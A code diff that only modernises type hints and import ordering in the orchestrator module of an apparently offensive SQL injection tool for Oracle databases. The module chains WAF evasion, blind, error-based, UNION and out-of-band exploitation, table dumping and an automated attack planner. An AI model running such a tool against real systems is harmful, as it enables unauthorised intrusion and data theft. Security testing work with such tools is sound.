@@ -25,53 +25,52 @@ Phase 20: AI Attack Planner & Exploitation Orchestrator. (NEW)
 
 import logging
 from dataclasses import dataclass, field
-from typing import Optional, Dict, List, Any, Union, Set, Tuple
+from typing import Any
+
 import requests
-
-from .payloads import OracleDetectionPayloads, DetectionPayload
-from .union_sqli import UnionSQLi
-from .html_parser import HTMLParser
-from .regex_utils import RegexUtils
-from .oracle_version import OracleVersionFingerprinter, OracleVersionResult
-from .oracle_schema import OracleSchemaEnumerator, OracleSchemaResult
-from .oracle_extractor import OracleDataExtractor, OracleExtractionResult
-from .oracle_privileges import OraclePrivilegeEnumerator, OraclePrivilegeResult
-from .oracle_database import OracleDatabaseEnumerator, OracleDatabaseResult
-from .sqli_detector import SQLiDetector, SQLiDetectionResult
-from .injection_points import InjectionPointDiscovery, InjectionDiscoveryResult
-from .column_detector import OracleColumnDetector, ColumnDetectionResult
-from .datatype_detector import OracleDataTypeDetector, DataTypeDetectionResult
-from .blind_boolean import OracleBlindBooleanEngine, BlindBooleanResult
-from .blind_time import OracleTimeBlindEngine, TimeBlindResult
-from .error_based import OracleErrorBasedEngine, ErrorBasedResult
-from .waf_detector import WAFDetector, WAFDetectionResult
-from .tamper_engine import TamperEngine, TamperResult
-from .union_exploiter import OracleUnionExploiter, UnionExploitResult
-from .database_dumper import OracleDatabaseDumper, DatabaseDumpResult
-from .oracle_attack import (
-    plan_attack_impl,
-    execute_plan_impl,
-)
-
-# Phase 18: Blind Data Extractor
-from .blind_extractor import (
-    BlindExtractor,
-    BlindExtractionResult,
-    ExtractionTechnique,
-    ExtractionStatus,
-    CharacterSet,
-)
-
-# Phase 19: Out-of-Band (OOB) Exploitation Engine
-from .oob_exploiter import OutOfBandExploiter, OOBExploitResult, OOBTechnique, OOBStatus
 
 # Phase 20: AI Attack Planner & Exploitation Orchestrator
 from .attack_planner import (
     AttackPlanner,
     AttackPlanResult,
     ExploitationStrategy,
-    RiskLevel,
 )
+from .blind_boolean import BlindBooleanResult, OracleBlindBooleanEngine
+
+# Phase 18: Blind Data Extractor
+from .blind_extractor import (
+    BlindExtractionResult,
+    BlindExtractor,
+    CharacterSet,
+    ExtractionStatus,
+    ExtractionTechnique,
+)
+from .blind_time import OracleTimeBlindEngine, TimeBlindResult
+from .column_detector import ColumnDetectionResult, OracleColumnDetector
+from .database_dumper import DatabaseDumpResult, OracleDatabaseDumper
+from .datatype_detector import DataTypeDetectionResult, OracleDataTypeDetector
+from .error_based import ErrorBasedResult, OracleErrorBasedEngine
+from .html_parser import HTMLParser
+from .injection_points import InjectionDiscoveryResult, InjectionPointDiscovery
+
+# Phase 19: Out-of-Band (OOB) Exploitation Engine
+from .oob_exploiter import OOBExploitResult, OOBStatus, OOBTechnique, OutOfBandExploiter
+from .oracle_attack import (
+    execute_plan_impl,
+    plan_attack_impl,
+)
+from .oracle_database import OracleDatabaseEnumerator, OracleDatabaseResult
+from .oracle_extractor import OracleDataExtractor, OracleExtractionResult
+from .oracle_privileges import OraclePrivilegeEnumerator, OraclePrivilegeResult
+from .oracle_schema import OracleSchemaEnumerator, OracleSchemaResult
+from .oracle_version import OracleVersionFingerprinter, OracleVersionResult
+from .payloads import DetectionPayload, OracleDetectionPayloads
+from .regex_utils import RegexUtils
+from .sqli_detector import SQLiDetectionResult, SQLiDetector
+from .tamper_engine import TamperEngine, TamperResult
+from .union_exploiter import OracleUnionExploiter, UnionExploitResult
+from .union_sqli import UnionSQLi
+from .waf_detector import WAFDetectionResult, WAFDetector
 
 
 @dataclass
@@ -81,35 +80,35 @@ class DetectionResult:
     is_oracle: bool = False
     score: int = 0
     threshold: int = 50
-    indicators: Dict[str, int] = field(default_factory=dict)
+    indicators: dict[str, int] = field(default_factory=dict)
     reason: str = ""
-    version_result: Optional[OracleVersionResult] = None
-    database_results: Optional[OracleDatabaseResult] = None
-    schema_result: Optional[OracleSchemaResult] = None
-    extraction_results: Optional[Dict[str, OracleExtractionResult]] = field(
+    version_result: OracleVersionResult | None = None
+    database_results: OracleDatabaseResult | None = None
+    schema_result: OracleSchemaResult | None = None
+    extraction_results: dict[str, OracleExtractionResult] | None = field(
         default_factory=dict
     )
-    privilege_results: Optional[OraclePrivilegeResult] = None
-    sqli_result: Optional[SQLiDetectionResult] = None
-    injection_discovery: Optional[InjectionDiscoveryResult] = None
-    column_detection: Optional[ColumnDetectionResult] = None
-    datatype_detection: Optional[DataTypeDetectionResult] = None
-    blind_boolean_result: Optional[BlindBooleanResult] = None
-    time_blind_result: Optional[TimeBlindResult] = None
-    error_based_result: Optional[ErrorBasedResult] = None
-    waf_result: Optional[WAFDetectionResult] = None
-    tamper_result: Optional[TamperResult] = None
-    union_result: Optional[UnionExploitResult] = None
-    dump_result: Optional[DatabaseDumpResult] = None
+    privilege_results: OraclePrivilegeResult | None = None
+    sqli_result: SQLiDetectionResult | None = None
+    injection_discovery: InjectionDiscoveryResult | None = None
+    column_detection: ColumnDetectionResult | None = None
+    datatype_detection: DataTypeDetectionResult | None = None
+    blind_boolean_result: BlindBooleanResult | None = None
+    time_blind_result: TimeBlindResult | None = None
+    error_based_result: ErrorBasedResult | None = None
+    waf_result: WAFDetectionResult | None = None
+    tamper_result: TamperResult | None = None
+    union_result: UnionExploitResult | None = None
+    dump_result: DatabaseDumpResult | None = None
 
     # Phase 18: Blind extraction result
-    blind_extract_result: Optional[BlindExtractionResult] = None
+    blind_extract_result: BlindExtractionResult | None = None
 
     # Phase 19: OOB exploitation result
-    oob_result: Optional[OOBExploitResult] = None
+    oob_result: OOBExploitResult | None = None
 
     # Phase 20: Attack plan result
-    attack_plan_result: Optional[AttackPlanResult] = None
+    attack_plan_result: AttackPlanResult | None = None
 
     def add_indicator(self, name: str, score: int):
         """Add an indicator and its score."""
@@ -170,7 +169,7 @@ class DetectionResult:
         else:
             return f"Oracle not detected (Score: {self.score}/{self.threshold})"
 
-    def to_dict(self) -> Dict[str, Any]:
+    def to_dict(self) -> dict[str, Any]:
         """Convert to dictionary for logging/output."""
         data = {
             "is_oracle": self.is_oracle,
@@ -276,7 +275,7 @@ class OracleEnum:
         self,
         session: requests.Session,
         base_url: str,
-        logger: Optional[logging.Logger] = None,
+        logger: logging.Logger | None = None,
     ):
         """
         Initialize OracleEnum module.
@@ -382,7 +381,7 @@ class OracleEnum:
 
         return logger
 
-    def _get_baseline(self, injection_point: str) -> Optional[requests.Response]:
+    def _get_baseline(self, injection_point: str) -> requests.Response | None:
         """Get baseline response for comparison."""
         if self.baseline_response is None:
             self.logger.info("[OracleEnum] Fetching baseline response...")
@@ -426,7 +425,7 @@ class OracleEnum:
 
         return indicator.lower() in response.text.lower()
 
-    def _extract_oracle_errors(self, response: requests.Response) -> List[str]:
+    def _extract_oracle_errors(self, response: requests.Response) -> list[str]:
         """Extract Oracle error codes from response."""
         return self.regex_utils.extract_oracle_errors(response.text)
 
@@ -452,7 +451,7 @@ class OracleEnum:
         diff = self.html_parser.response_diff(baseline.text, response.text)
 
         if diff.get("significant_change", False):
-            self.logger.info(f"[OracleEnum] Significant response change detected")
+            self.logger.info("[OracleEnum] Significant response change detected")
             self.logger.info(
                 f"[OracleEnum] Response length diff: {diff.get('length_diff', 0)}"
             )
@@ -475,7 +474,7 @@ class OracleEnum:
 
     def _test_payload(
         self, injection_point: str, payload: DetectionPayload
-    ) -> Dict[str, Any]:
+    ) -> dict[str, Any]:
         """Test a single payload and evaluate response."""
         self.logger.info(f"[OracleEnum] Testing: {payload.description}")
         self.logger.info(f"[OracleEnum] Payload: {payload.payload}")
@@ -558,17 +557,17 @@ class OracleEnum:
         # Phase 18: Blind extraction parameters
         blind_extract: bool = False,
         blind_target_type: str = "all",
-        blind_target_name: Optional[str] = None,
+        blind_target_name: str | None = None,
         blind_max_items: int = 1000,
         # Phase 19: OOB exploitation parameters
         exploit_oob: bool = False,
-        oob_query: Optional[str] = None,
-        oob_techniques: Optional[List[OOBTechnique]] = None,
+        oob_query: str | None = None,
+        oob_techniques: list[OOBTechnique] | None = None,
         oob_auto_detect: bool = True,
         # Phase 20: Attack planning parameters
         create_attack_plan: bool = True,
         auto_exploit: bool = False,
-        auto_exploit_query: Optional[str] = None,
+        auto_exploit_query: str | None = None,
     ) -> DetectionResult:
         """
         Main detection method for Oracle.
@@ -643,7 +642,7 @@ class OracleEnum:
                             f"[OracleEnum] Recommended tampers for {waf_result.waf_name}: {recommended_tampers}"
                         )
             except Exception as e:
-                self.logger.error(f"[OracleEnum] WAF detection failed: {str(e)}")
+                self.logger.error(f"[OracleEnum] WAF detection failed: {e!s}")
 
         # Phase 8: Injection Point Discovery
         if discover_parameters:
@@ -668,7 +667,7 @@ class OracleEnum:
                     self._current_injection_point = injection_point
             except Exception as e:
                 self.logger.error(
-                    f"[OracleEnum] Injection point discovery failed: {str(e)}"
+                    f"[OracleEnum] Injection point discovery failed: {e!s}"
                 )
 
         # Phase 9: Column Detection
@@ -694,7 +693,7 @@ class OracleEnum:
                             f"[OracleEnum] Best UNION payload: {column_result.union_payload[:50]}..."
                         )
             except Exception as e:
-                self.logger.error(f"[OracleEnum] Column detection failed: {str(e)}")
+                self.logger.error(f"[OracleEnum] Column detection failed: {e!s}")
 
         # Phase 10: Data Type Detection
         if (
@@ -720,7 +719,7 @@ class OracleEnum:
                         f"[OracleEnum] Best UNION payload: {datatype_result.working_union_payload[:50]}..."
                     )
             except Exception as e:
-                self.logger.error(f"[OracleEnum] Data type detection failed: {str(e)}")
+                self.logger.error(f"[OracleEnum] Data type detection failed: {e!s}")
 
         # Phase 11: Blind Boolean Detection
         if detect_blind_boolean:
@@ -738,7 +737,7 @@ class OracleEnum:
 
                 if blind_result.is_vulnerable:
                     self.logger.info(
-                        f"[OracleEnum] Boolean blind SQL injection confirmed!"
+                        "[OracleEnum] Boolean blind SQL injection confirmed!"
                     )
                     self.logger.info(
                         f"[OracleEnum] Best true payload: {blind_result.best_true_payload}"
@@ -747,9 +746,7 @@ class OracleEnum:
                         f"[OracleEnum] Best false payload: {blind_result.best_false_payload}"
                     )
             except Exception as e:
-                self.logger.error(
-                    f"[OracleEnum] Blind boolean detection failed: {str(e)}"
-                )
+                self.logger.error(f"[OracleEnum] Blind boolean detection failed: {e!s}")
 
         # Phase 12: Time Blind Detection
         if detect_time_blind:
@@ -765,7 +762,7 @@ class OracleEnum:
 
                 if time_result.is_vulnerable:
                     self.logger.info(
-                        f"[OracleEnum] Time-based blind SQL injection confirmed!"
+                        "[OracleEnum] Time-based blind SQL injection confirmed!"
                     )
                     self.logger.info(
                         f"[OracleEnum] Delay: {time_result.delay_seconds:.2f}s"
@@ -774,7 +771,7 @@ class OracleEnum:
                         f"[OracleEnum] Best payload: {time_result.best_payload}"
                     )
             except Exception as e:
-                self.logger.error(f"[OracleEnum] Time blind detection failed: {str(e)}")
+                self.logger.error(f"[OracleEnum] Time blind detection failed: {e!s}")
 
         # Phase 13: Error Based Detection
         if detect_error_based:
@@ -792,7 +789,7 @@ class OracleEnum:
 
                 if error_result.is_vulnerable:
                     self.logger.info(
-                        f"[OracleEnum] Error-based SQL injection confirmed!"
+                        "[OracleEnum] Error-based SQL injection confirmed!"
                     )
                     self.logger.info(
                         f"[OracleEnum] Best payload: {error_result.best_payload}"
@@ -802,9 +799,7 @@ class OracleEnum:
                             f"[OracleEnum] Extracted values: {list(error_result.extracted_values.values())[:3]}"
                         )
             except Exception as e:
-                self.logger.error(
-                    f"[OracleEnum] Error-based detection failed: {str(e)}"
-                )
+                self.logger.error(f"[OracleEnum] Error-based detection failed: {e!s}")
 
         # Phase 16: UNION Exploitation
         if exploit_union:
@@ -830,7 +825,7 @@ class OracleEnum:
                         f"[OracleEnum] Column count: {union_result.column_count}"
                     )
             except Exception as e:
-                self.logger.error(f"[OracleEnum] UNION exploitation failed: {str(e)}")
+                self.logger.error(f"[OracleEnum] UNION exploitation failed: {e!s}")
 
         # Phase 7: SQL Injection Detection
         if detect_sqli:
@@ -853,9 +848,7 @@ class OracleEnum:
                         "[OracleEnum] No SQL injection detected with high confidence"
                     )
             except Exception as e:
-                self.logger.error(
-                    f"[OracleEnum] SQL Injection detection failed: {str(e)}"
-                )
+                self.logger.error(f"[OracleEnum] SQL Injection detection failed: {e!s}")
 
         # Step 1: Check page title
         self.logger.info("[OracleEnum] Step 1: Checking page title...")
@@ -886,7 +879,7 @@ class OracleEnum:
             errors = self._extract_oracle_errors(baseline)
             if errors:
                 result.add_indicator("oracle_errors_in_baseline", 10)
-                self.logger.info(f"[OracleEnum] Oracle errors in baseline: +10")
+                self.logger.info("[OracleEnum] Oracle errors in baseline: +10")
 
         # Determine if Oracle is detected
         result.is_oracle = result.score >= result.threshold
@@ -914,7 +907,7 @@ class OracleEnum:
                     )
                 except Exception as e:
                     self.logger.error(
-                        f"[OracleEnum] Version fingerprinting failed: {str(e)}"
+                        f"[OracleEnum] Version fingerprinting failed: {e!s}"
                     )
 
             # Phase 6: Database Enumeration
@@ -932,7 +925,7 @@ class OracleEnum:
                     )
                 except Exception as e:
                     self.logger.error(
-                        f"[OracleEnum] Database enumeration failed: {str(e)}"
+                        f"[OracleEnum] Database enumeration failed: {e!s}"
                     )
 
             # Phase 3: Schema Enumeration
@@ -949,9 +942,7 @@ class OracleEnum:
                         f"[OracleEnum] Schema enumeration complete: {schema_result.get_summary()}"
                     )
                 except Exception as e:
-                    self.logger.error(
-                        f"[OracleEnum] Schema enumeration failed: {str(e)}"
-                    )
+                    self.logger.error(f"[OracleEnum] Schema enumeration failed: {e!s}")
 
             # Phase 5: Privilege Enumeration
             if enumerate_privileges:
@@ -968,7 +959,7 @@ class OracleEnum:
                     )
                 except Exception as e:
                     self.logger.error(
-                        f"[OracleEnum] Privilege enumeration failed: {str(e)}"
+                        f"[OracleEnum] Privilege enumeration failed: {e!s}"
                     )
 
             # Phase 4: Data Extraction
@@ -993,7 +984,7 @@ class OracleEnum:
                                 )
                             except Exception as e:
                                 self.logger.error(
-                                    f"[OracleEnum] Data extraction failed for {schema}.{table}: {str(e)}"
+                                    f"[OracleEnum] Data extraction failed for {schema}.{table}: {e!s}"
                                 )
 
                     result.extraction_results = extraction_results
@@ -1001,7 +992,7 @@ class OracleEnum:
                         f"[OracleEnum] Data extraction complete: {len(extraction_results)} tables"
                     )
                 except Exception as e:
-                    self.logger.error(f"[OracleEnum] Data extraction failed: {str(e)}")
+                    self.logger.error(f"[OracleEnum] Data extraction failed: {e!s}")
 
             # ============================================================
             # Phase 18: Blind Extraction
@@ -1032,7 +1023,7 @@ class OracleEnum:
                             f"[OracleEnum] Blind extraction failed: {blind_result.errors[0] if blind_result.errors else 'Unknown error'}"
                         )
                 except Exception as e:
-                    self.logger.error(f"[OracleEnum] Blind extraction failed: {str(e)}")
+                    self.logger.error(f"[OracleEnum] Blind extraction failed: {e!s}")
                     result.blind_extract_result = BlindExtractionResult(
                         success=False, errors=[str(e)], status=ExtractionStatus.FAILED
                     )
@@ -1065,7 +1056,7 @@ class OracleEnum:
                             f"[OracleEnum] OOB exploitation failed: {oob_result.errors[0] if oob_result.errors else 'Unknown error'}"
                         )
                 except Exception as e:
-                    self.logger.error(f"[OracleEnum] OOB exploitation failed: {str(e)}")
+                    self.logger.error(f"[OracleEnum] OOB exploitation failed: {e!s}")
                     result.oob_result = OOBExploitResult(
                         success=False, errors=[str(e)], status=OOBStatus.FAILED
                     )
@@ -1104,11 +1095,11 @@ class OracleEnum:
                         )
                 except Exception as e:
                     self.logger.error(
-                        f"[OracleEnum] Attack plan creation failed: {str(e)}"
+                        f"[OracleEnum] Attack plan creation failed: {e!s}"
                     )
                     result.attack_plan_result = AttackPlanResult(
                         success=False,
-                        reasoning=[f"Attack plan creation failed: {str(e)}"],
+                        reasoning=[f"Attack plan creation failed: {e!s}"],
                     )
 
                 # Auto-exploit if requested
@@ -1140,7 +1131,7 @@ class OracleEnum:
                             )
                     except Exception as e:
                         self.logger.error(
-                            f"[OracleEnum] Auto-exploitation failed: {str(e)}"
+                            f"[OracleEnum] Auto-exploitation failed: {e!s}"
                         )
         else:
             result.reason = f"Score {result.score} below threshold {result.threshold}"
@@ -1262,7 +1253,7 @@ class OracleEnum:
 
     def _execute_strategy(
         self, strategy: ExploitationStrategy, injection_point: str, **kwargs
-    ) -> Dict[str, Any]:
+    ) -> dict[str, Any]:
         """
         Execute a specific exploitation strategy.
 
@@ -1380,8 +1371,8 @@ class OracleEnum:
         return execute_plan_impl(self, *args, **kwargs)
 
     def auto_exploit(
-        self, injection_point: str, query: Optional[str] = None, **kwargs
-    ) -> Dict[str, Any]:
+        self, injection_point: str, query: str | None = None, **kwargs
+    ) -> dict[str, Any]:
         """
         Fully automatic exploitation - plan and execute.
 
@@ -1422,7 +1413,7 @@ class OracleEnum:
 
         return results
 
-    def get_attack_plan_summary(self) -> Optional[str]:
+    def get_attack_plan_summary(self) -> str | None:
         """
         Get a summary of the current attack plan.
 
@@ -1433,7 +1424,7 @@ class OracleEnum:
             return self.detection_result.attack_plan_result.get_summary()
         return None
 
-    def get_available_strategies(self) -> List[str]:
+    def get_available_strategies(self) -> list[str]:
         """
         Get all available exploitation strategies.
 
@@ -1510,10 +1501,10 @@ class OracleEnum:
         self,
         injection_point: str,
         target_type: str = "all",
-        target_name: Optional[str] = None,
+        target_name: str | None = None,
         max_items: int = 1000,
         auto_detect_technique: bool = True,
-        technique: Optional[ExtractionTechnique] = None,
+        technique: ExtractionTechnique | None = None,
     ) -> BlindExtractionResult:
         """Perform complete blind extraction."""
         self.logger.info("[OracleEnum] Starting blind extraction...")
@@ -1550,7 +1541,7 @@ class OracleEnum:
             return result
 
         except Exception as e:
-            self.logger.error(f"[OracleEnum] Blind extraction failed: {str(e)}")
+            self.logger.error(f"[OracleEnum] Blind extraction failed: {e!s}")
             return BlindExtractionResult(
                 success=False,
                 errors=[str(e)],
@@ -1564,7 +1555,7 @@ class OracleEnum:
         max_length: int = 255,
         charset: CharacterSet = CharacterSet.ASCII_PRINTABLE,
         use_binary_search: bool = True,
-    ) -> Optional[str]:
+    ) -> str | None:
         """Extract a string using blind injection."""
         self.logger.info("[OracleEnum] Extracting string via blind injection...")
         extractor = self._ensure_blind_extractor(injection_point)
@@ -1572,21 +1563,21 @@ class OracleEnum:
         extractor.use_binary_search = use_binary_search
         return extractor.extract_string(query, max_length)
 
-    def extract_blind_database(self, injection_point: str) -> Optional[str]:
+    def extract_blind_database(self, injection_point: str) -> str | None:
         """Extract database name using blind injection."""
         self.logger.info("[OracleEnum] Extracting database name via blind injection...")
         extractor = self._ensure_blind_extractor(injection_point)
         query = "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual"
         return extractor.extract_string(query, 255)
 
-    def extract_blind_user(self, injection_point: str) -> Optional[str]:
+    def extract_blind_user(self, injection_point: str) -> str | None:
         """Extract current user using blind injection."""
         self.logger.info("[OracleEnum] Extracting current user via blind injection...")
         extractor = self._ensure_blind_extractor(injection_point)
         query = "SELECT USER FROM dual"
         return extractor.extract_string(query, 255)
 
-    def extract_blind_version(self, injection_point: str) -> Optional[str]:
+    def extract_blind_version(self, injection_point: str) -> str | None:
         """Extract database version using blind injection."""
         self.logger.info(
             "[OracleEnum] Extracting database version via blind injection..."
@@ -1599,7 +1590,7 @@ class OracleEnum:
         self,
         injection_point: str,
         max_tables: int = 50,
-    ) -> List[str]:
+    ) -> list[str]:
         """Extract table names using blind injection."""
         self.logger.info("[OracleEnum] Extracting table names via blind injection...")
         extractor = self._ensure_blind_extractor(injection_point)
@@ -1620,7 +1611,7 @@ class OracleEnum:
         injection_point: str,
         table_name: str,
         max_columns: int = 30,
-    ) -> List[str]:
+    ) -> list[str]:
         """Extract column names from a table using blind injection."""
         self.logger.info(
             f"[OracleEnum] Extracting columns from {table_name} via blind injection..."
@@ -1642,9 +1633,9 @@ class OracleEnum:
         self,
         injection_point: str,
         table_name: str,
-        columns: List[str],
+        columns: list[str],
         max_rows: int = 100,
-    ) -> List[Dict[str, Any]]:
+    ) -> list[dict[str, Any]]:
         """Extract data from a table using blind injection."""
         self.logger.info(
             f"[OracleEnum] Extracting data from {table_name} via blind injection..."
@@ -1669,7 +1660,7 @@ class OracleEnum:
 
         return data
 
-    def get_blind_extract_progress(self) -> Dict[str, Any]:
+    def get_blind_extract_progress(self) -> dict[str, Any]:
         """Get current blind extraction progress."""
         if self.blind_extractor:
             return self.blind_extractor.track_progress(
@@ -1682,7 +1673,7 @@ class OracleEnum:
             )
         return {"status": "Not initialized"}
 
-    def save_blind_checkpoint(self) -> Optional[str]:
+    def save_blind_checkpoint(self) -> str | None:
         """Save a checkpoint for blind extraction."""
         if self.blind_extractor and self.blind_extractor.extraction_result:
             return self.blind_extractor.save_checkpoint()
@@ -1716,7 +1707,7 @@ class OracleEnum:
         """Check if blind extraction is in progress."""
         return self.blind_extractor.is_extracting() if self.blind_extractor else False
 
-    def get_blind_statistics(self) -> Dict[str, Any]:
+    def get_blind_statistics(self) -> dict[str, Any]:
         """Get blind extraction statistics."""
         if self.blind_extractor:
             return self.blind_extractor.get_statistics()
@@ -1755,7 +1746,7 @@ class OracleEnum:
         self,
         injection_point: str,
         query: str,
-        techniques: Optional[List[OOBTechnique]] = None,
+        techniques: list[OOBTechnique] | None = None,
         auto_detect: bool = True,
     ) -> OOBExploitResult:
         """
@@ -1787,24 +1778,24 @@ class OracleEnum:
             return result
 
         except Exception as e:
-            self.logger.error(f"[OracleEnum] OOB exploitation failed: {str(e)}")
+            self.logger.error(f"[OracleEnum] OOB exploitation failed: {e!s}")
             return OOBExploitResult(
                 success=False, errors=[str(e)], status=OOBStatus.FAILED
             )
 
-    def extract_database_oob(self, injection_point: str) -> Tuple[Optional[str], float]:
+    def extract_database_oob(self, injection_point: str) -> tuple[str | None, float]:
         """Extract database name using OOB techniques."""
         self.logger.info("[OracleEnum] Extracting database name via OOB...")
         exploiter = self._ensure_oob_exploiter(injection_point)
         return exploiter.extract_database_name_oob()
 
-    def extract_user_oob(self, injection_point: str) -> Tuple[Optional[str], float]:
+    def extract_user_oob(self, injection_point: str) -> tuple[str | None, float]:
         """Extract current user using OOB techniques."""
         self.logger.info("[OracleEnum] Extracting current user via OOB...")
         exploiter = self._ensure_oob_exploiter(injection_point)
         return exploiter.extract_current_user_oob()
 
-    def extract_version_oob(self, injection_point: str) -> Tuple[Optional[str], float]:
+    def extract_version_oob(self, injection_point: str) -> tuple[str | None, float]:
         """Extract database version using OOB techniques."""
         self.logger.info("[OracleEnum] Extracting database version via OOB...")
         exploiter = self._ensure_oob_exploiter(injection_point)
@@ -1814,21 +1805,21 @@ class OracleEnum:
         self,
         injection_point: str,
         table_name: str,
-        columns: List[str],
+        columns: list[str],
         max_rows: int = 10,
-    ) -> List[Dict[str, Any]]:
+    ) -> list[dict[str, Any]]:
         """Extract table data using OOB techniques."""
         self.logger.info(f"[OracleEnum] Extracting {table_name} data via OOB...")
         exploiter = self._ensure_oob_exploiter(injection_point)
         return exploiter.extract_table_data_oob(table_name, columns, max_rows)
 
-    def detect_oob_capabilities(self, injection_point: str) -> Dict[str, bool]:
+    def detect_oob_capabilities(self, injection_point: str) -> dict[str, bool]:
         """Detect available OOB capabilities."""
         self.logger.info("[OracleEnum] Detecting OOB capabilities...")
         exploiter = self._ensure_oob_exploiter(injection_point)
         return exploiter.detect_capabilities()
 
-    def get_oob_statistics(self) -> Dict[str, Any]:
+    def get_oob_statistics(self) -> dict[str, Any]:
         """Get OOB exploitation statistics."""
         if self.oob_exploiter:
             return self.oob_exploiter.get_statistics()
@@ -1898,14 +1889,14 @@ class OracleEnum:
     # Phase 2: Version Methods
     # ============================================================
 
-    def get_oracle_version(self, injection_point: str) -> Optional[str]:
+    def get_oracle_version(self, injection_point: str) -> str | None:
         """Get Oracle version."""
         if not self.is_oracle(injection_point):
             self.logger.warning("[OracleEnum] Cannot get version - Oracle not detected")
             return None
         return self.version_fingerprinter.get_version(injection_point)
 
-    def get_oracle_edition(self, injection_point: str) -> Optional[str]:
+    def get_oracle_edition(self, injection_point: str) -> str | None:
         """Get Oracle edition."""
         if not self.is_oracle(injection_point):
             self.logger.warning("[OracleEnum] Cannot get edition - Oracle not detected")
@@ -1932,7 +1923,7 @@ class OracleEnum:
             return result
         return self.schema_enumerator.enumerate_all(injection_point)
 
-    def get_database_information(self, injection_point: str) -> Dict[str, Any]:
+    def get_database_information(self, injection_point: str) -> dict[str, Any]:
         """Get basic database information only."""
         if not self.is_oracle(injection_point):
             self.logger.warning(
@@ -1941,7 +1932,7 @@ class OracleEnum:
             return {"error": "Oracle not detected"}
         return self.schema_enumerator.get_database_info(injection_point)
 
-    def get_current_user(self, injection_point: str) -> Optional[str]:
+    def get_current_user(self, injection_point: str) -> str | None:
         """Get current database user."""
         if not self.is_oracle(injection_point):
             self.logger.warning("[OracleEnum] Cannot get user - Oracle not detected")
@@ -1957,8 +1948,8 @@ class OracleEnum:
         injection_point: str,
         schema: str,
         table: str,
-        columns: Optional[List[str]] = None,
-        max_rows: Optional[int] = None,
+        columns: list[str] | None = None,
+        max_rows: int | None = None,
     ) -> OracleExtractionResult:
         """Extract data from a specific table."""
         if not self.is_oracle(injection_point):
@@ -1977,9 +1968,9 @@ class OracleEnum:
         injection_point: str,
         schema: str,
         table: str,
-        columns: Optional[List[str]] = None,
-        limit: Optional[int] = None,
-        offset: Optional[int] = 0,
+        columns: list[str] | None = None,
+        limit: int | None = None,
+        offset: int | None = 0,
     ) -> OracleExtractionResult:
         """Extract rows with pagination."""
         if not self.is_oracle(injection_point):
@@ -2017,7 +2008,7 @@ class OracleEnum:
             return result
         return self.privilege_enumerator.enumerate_all(injection_point)
 
-    def get_current_privileged_user(self, injection_point: str) -> Optional[str]:
+    def get_current_privileged_user(self, injection_point: str) -> str | None:
         """Get current database user (privilege context)."""
         if not self.is_oracle(injection_point):
             self.logger.warning("[OracleEnum] Cannot get user - Oracle not detected")
@@ -2046,7 +2037,7 @@ class OracleEnum:
             return result
         return self.database_enumerator.enumerate_all(injection_point)
 
-    def get_database_version_info(self, injection_point: str) -> Optional[str]:
+    def get_database_version_info(self, injection_point: str) -> str | None:
         """Get database version only."""
         if not self.is_oracle(injection_point):
             self.logger.warning(
@@ -2055,7 +2046,7 @@ class OracleEnum:
             return None
         return self.database_enumerator.get_version(injection_point)
 
-    def get_instance_name_info(self, injection_point: str) -> Optional[str]:
+    def get_instance_name_info(self, injection_point: str) -> str | None:
         """Get instance name only."""
         if not self.is_oracle(injection_point):
             self.logger.warning(
@@ -2080,7 +2071,7 @@ class OracleEnum:
         self.logger.info("[OracleEnum] Checking SQL injection vulnerability...")
         return self.sqli_detector.is_vulnerable(injection_point)
 
-    def get_sqli_payload(self, injection_point: str) -> Optional[str]:
+    def get_sqli_payload(self, injection_point: str) -> str | None:
         """Get working SQL injection payload."""
         self.logger.info("[OracleEnum] Getting SQL injection payload...")
         return self.sqli_detector.get_payload(injection_point)
@@ -2097,11 +2088,11 @@ class OracleEnum:
     def discover_injection_points(
         self,
         url: str,
-        data: Optional[Union[str, Dict]] = None,
-        json_data: Optional[Union[str, Dict]] = None,
-        xml_data: Optional[str] = None,
-        cookies: Optional[Dict[str, str]] = None,
-        headers: Optional[Dict[str, str]] = None,
+        data: str | dict | None = None,
+        json_data: str | dict | None = None,
+        xml_data: str | None = None,
+        cookies: dict[str, str] | None = None,
+        headers: dict[str, str] | None = None,
         test_parameters: bool = True,
     ) -> InjectionDiscoveryResult:
         """Discover all injection points in a request."""
@@ -2110,7 +2101,7 @@ class OracleEnum:
             url, data, json_data, xml_data, cookies, headers, test_parameters
         )
 
-    def get_injection_points(self) -> List[Dict[str, Any]]:
+    def get_injection_points(self) -> list[dict[str, Any]]:
         """Get all discovered injection points as dictionaries."""
         if self.detection_result and self.detection_result.injection_discovery:
             return [
@@ -2119,14 +2110,14 @@ class OracleEnum:
             ]
         return []
 
-    def get_best_injection_point(self) -> Optional[Dict[str, Any]]:
+    def get_best_injection_point(self) -> dict[str, Any] | None:
         """Get the best injection point."""
         if self.detection_result and self.detection_result.injection_discovery:
             best = self.detection_result.injection_discovery.get_best_parameter()
             return best.to_dict() if best else None
         return None
 
-    def get_injectable_parameters(self) -> List[Dict[str, Any]]:
+    def get_injectable_parameters(self) -> list[dict[str, Any]]:
         """Get all injectable parameters."""
         if self.detection_result and self.detection_result.injection_discovery:
             injectable = (
@@ -2153,14 +2144,14 @@ class OracleEnum:
         result = self.column_detector.detect_column_count(injection_point)
         return result.column_count if result.success else 0
 
-    def get_reflective_columns(self, injection_point: str) -> List[int]:
+    def get_reflective_columns(self, injection_point: str) -> list[int]:
         """Get reflective column indices."""
         if self.detection_result and self.detection_result.column_detection:
             return self.detection_result.column_detection.reflective_columns
         result = self.column_detector.detect_column_count(injection_point)
         return result.reflective_columns if result.success else []
 
-    def get_union_payload(self, injection_point: str) -> Optional[str]:
+    def get_union_payload(self, injection_point: str) -> str | None:
         """Get the best UNION payload."""
         return self.column_detector.get_best_union_payload(injection_point)
 
@@ -2169,23 +2160,23 @@ class OracleEnum:
     # ============================================================
 
     def detect_datatypes(
-        self, injection_point: str, column_count: Optional[int] = None
+        self, injection_point: str, column_count: int | None = None
     ) -> DataTypeDetectionResult:
         """Detect data types for all columns."""
         self.logger.info("[OracleEnum] Detecting data types...")
         return self.datatype_detector.detect_column_types(injection_point, column_count)
 
     def get_best_union_payload_dt(
-        self, injection_point: str, column_count: Optional[int] = None
-    ) -> Optional[str]:
+        self, injection_point: str, column_count: int | None = None
+    ) -> str | None:
         """Get the best UNION payload from data type detection."""
         return self.datatype_detector.get_best_union_payload(
             injection_point, column_count
         )
 
     def get_reflective_column_dt(
-        self, injection_point: str, column_count: Optional[int] = None
-    ) -> Optional[int]:
